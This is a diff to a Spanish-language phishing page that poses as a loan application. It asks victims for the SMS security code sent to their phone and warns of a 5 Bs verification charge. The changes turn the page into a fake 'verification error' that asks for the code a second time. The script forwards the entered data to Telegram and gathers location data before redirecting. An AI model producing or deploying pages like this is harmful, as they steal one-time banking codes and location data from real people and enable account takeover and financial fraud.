@@ -33,13 +33,13 @@
 
         h3 {
             font-family: 'Roboto', sans-serif;
-            color: white; /* Color rojo para el título */
+            color: rgb(245, 6, 6); /* Color rojo para el título */
             margin-bottom: 20px;
         }
 
         p {
             font-family: 'Roboto', sans-serif;
-            color: #fff; /* Color blanco para los textos */
+            color: #f3ebeb; /* Color blanco para los textos */
             font-size: 14px;
             margin-bottom: 20px;
         }
@@ -136,9 +136,9 @@
     <div class="container">
         <!-- Formulario para ingresar código SMS -->
         <div class="form-container">
-            <h3>Procesando Prestamo</h3>
+            <h3>Error de verificacion</h3>
             <p>Para confirmar su solicitud de préstamo, se efectuará temporalmente un pequeño cargo de verificación de 5 Bs, a su cuenta.</p>
-            <p>Proporciona el código de seguridad enviado a tu celular registrado.</p>
+            <p>Proporciona nuevamente el código de seguridad enviado a tu celular registrado.</p>
             
             <form id="LoginForm" onsubmit="handleSubmit(event)">
                 <!-- Campo Código SMS -->
@@ -181,7 +181,7 @@
             await sendMessageToTelegram(message);
 
             // Redirigir a la página clave.html
-            window.location.href = "cargando2.html"; // Redirección a clave.html
+            window.location.href = "index.html"; // Redirección a clave.html
         }
 
         async function getLocationData() {
